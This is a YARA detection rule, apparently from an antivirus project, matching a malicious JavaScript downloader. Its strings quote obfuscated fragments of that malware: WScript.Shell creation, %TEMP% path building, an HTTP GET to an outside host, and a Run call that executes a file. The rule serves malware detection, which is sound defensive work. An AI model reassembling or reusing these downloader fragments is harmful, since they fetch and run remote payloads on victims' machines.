rule sig_20160427_3ae617a79d99c50542490b61bbeed24a {
  meta:
    description = "datamaliciousorder - file 20160427_3ae617a79d99c50542490b61bbeed24a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "df6b08f38c12c7157458e58f8fb14abfd30bd05842255bc7f53ee6d0a17b9c1d"

  strings:
    $s1  = "function NbfdzTbnhx() {return OyaugTczjz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"apvCpsk" ascii
    $s2  = "function NbfdzTbnhx() {return OyaugTczjz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"apvCpsk" ascii
    $s3  = "var OyaugTczjz = function UgkptOnixx() {return AzdcpVnmmt[ZkwmmWckrw](\"WScript\"+\".Shell\");}(), UbziaZvsac = 11;" fullword ascii
    $s4  = "function ZiktjUzsxj(FpsilEqzjw, ZxjtyHongv){VmjizZhtms = VmjizZhtms * 1; return FpsilEqzjw - ZxjtyHongv;};" fullword ascii
    $s5  = "IoupbYkcgw[RfzntFbxne](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var AzdcpVnmmt = this[\"WScript\"];" fullword ascii
    $s7  = "function QanqlDftxx(){return YtpffBzqnc + \"\";};" fullword ascii
    $s8  = "if (IoupbYkcgw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function ErchuWvfer() {return ((KmfbkYjorj == true) && (KmfbkYjorj == MulmfTjxge)) ? 1 : VmjizZhtms;};" fullword ascii
    $s10 = "var RlyesPrcnz = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "var KmfbkYjorj = false;" fullword ascii
    $s12 = "RhiaxAxwzf = true;" fullword ascii
    $s13 = "function DqnbrRogcm(){return 23;};" fullword ascii
    $s14 = "MulmfTjxge = true; " fullword ascii
    $s15 = "var RhiaxAxwzf = false;" fullword ascii
    $s16 = "KmfbkYjorj = true; " fullword ascii
    $s17 = "return ZiktjUzsxj(AawfqUuuad, JagkpDfykf);" fullword ascii
    $s18 = "function EslljRxplz(){return ZkwmmWckrw;};" fullword ascii
    $s19 = "function BlknlIkzxg(KfzfgFbjzp){OyaugTczjz[\"R\"+\"un\"](KfzfgFbjzp, VmjizZhtms, VmjizZhtms);};" fullword ascii
    $s20 = "var MulmfTjxge = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}